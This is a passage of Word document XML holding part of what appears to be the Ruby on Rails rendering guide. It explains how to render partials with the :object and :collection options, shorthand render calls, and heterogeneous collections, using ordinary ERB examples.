        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Every partial also has a local variable with the same name as the partial (minus the underscore). You can pass an object in to this local variable via the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:object</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7150"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7BF357EB" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DD97F3E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="962229034"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "customer", :object</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @new_customer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4180CFE0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Within the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> partial, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable will refer to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@new_customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the parent view.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B3A7CF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In previous versions of Rails, the default local variable would look for an instance variable with the same name as the partial in the parent. This behavior was deprecated in 2.3 and has been removed in Rails 3.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58396519" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you have an instance of a model to render into a partial, you can use a shorthand syntax:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2615"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="67C764A0" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2CE85310" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1487211512"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render @customer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="676C49D4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Assuming that the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance variable contains an instance of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model, this will use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_customer.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to render it and will pass the local variable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> into the partial which will refer to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@customer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instance variable in the parent view.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405945F3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.5 Rendering Collections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDD3F63" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Partials are very useful in rendering collections. When you pass a collection to a partial via the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:collection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, the partial will be inserted once for each member in the collection:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D59713" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7030"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0DD1E52F" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A119322" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Products&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F467A62" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :partial</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "product", :collection</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; @products</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4851FEE9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_product.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4728"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="659A872A" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0CAD0B63" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1617324045"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;Product Name: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>product.name %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74404AEB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When a partial is called with a pluralized collection, then the individual instances of the partial have access to the member of the collection being rendered via a variable named after the partial. In this case, the partial is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and within the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> partial, you can refer to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to get the instance that is being rendered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61871274" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Rails 3.0, there is also a shorthand for this. Assuming </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@products</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a collection of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>product</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instances, you can simply write this in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to produce the same result:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2615"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="08A2D036" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15DBDA5D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Products&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E54DCAE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render @products</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="691A68A7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails determines the name of the partial to use by looking at the model name in the collection. In fact, you can even create a heterogeneous collection and render it this way, and Rails will choose the proper partial for each member of the collection:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352DC1FC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the event that the collection is empty, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will return nil, so it should be fairly simple to provide alternative content.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7295"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="68379B14" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3777A8EE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Products&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="049877C6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render(@products) || 'There are no products available.'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3845384A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6888"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1180C7EE" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="528D498C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Contacts&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="114B5176" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render [customer1, employee1, customer2, employee2] %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1482A172" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="81"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>customers/_customer.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4368"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0EB30440" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72785DCA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1959799763"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;Customer: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer.name %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04B6B417" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>employees/_employee.html.erb</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4368"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="37D6E271" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7027899B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="133068312"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;Employee: &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>employee.name %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="49B9C884" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In this case, Rails will use the customer or employee partials as appropriate for each member of the collection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774E4405" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.6 Local Variables</w:t>
      </w:r>
    </w:p>
